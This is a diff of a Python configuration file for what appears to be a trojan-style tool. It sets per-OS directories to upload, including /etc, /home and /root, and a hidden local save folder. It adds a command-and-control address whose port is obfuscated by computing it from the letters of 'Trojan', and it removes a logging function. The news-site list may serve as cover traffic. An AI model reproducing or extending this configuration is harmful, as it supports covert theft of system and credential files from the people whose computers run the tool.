@@ -5,10 +5,7 @@ Created on Wed Jun 17 20:16:47 2020
 
 @author: 劉又聖
 """
-def set_logging():
-    import logging
-    logging.basicConfig(level=logging.DEBUG, format='%(levelname)5s:%(message)s')
-    return
+
 
 upload_dirs = {
                 'Linux': ['/etc', '/home', '/root'],
@@ -26,8 +23,8 @@ client_save_dirs = {
                 'Windows': 'D:\\Tmp\\SaveFiles\\Local',
                 'Darwin': '/tmp/.normal',
               }
+server_sock_addr = ['10.21.23.10:{}'.format( ord('T')*sum(map(ord, 'rojan')) )]
 news_website = [
-    'https://xrds.acm.org/news.cfm',
     'https://www.bbc.com/news/technology',
     'https://techcrunch.com/',
     'https://www.wired.com/',
@@ -35,4 +32,5 @@ news_website = [
     'https://www.sciencealert.com/',
     'https://www.eff.org/',
     'https://www.nytimes.com/section/technology',
+    'https://xrds.acm.org/news.cfm',
     ]
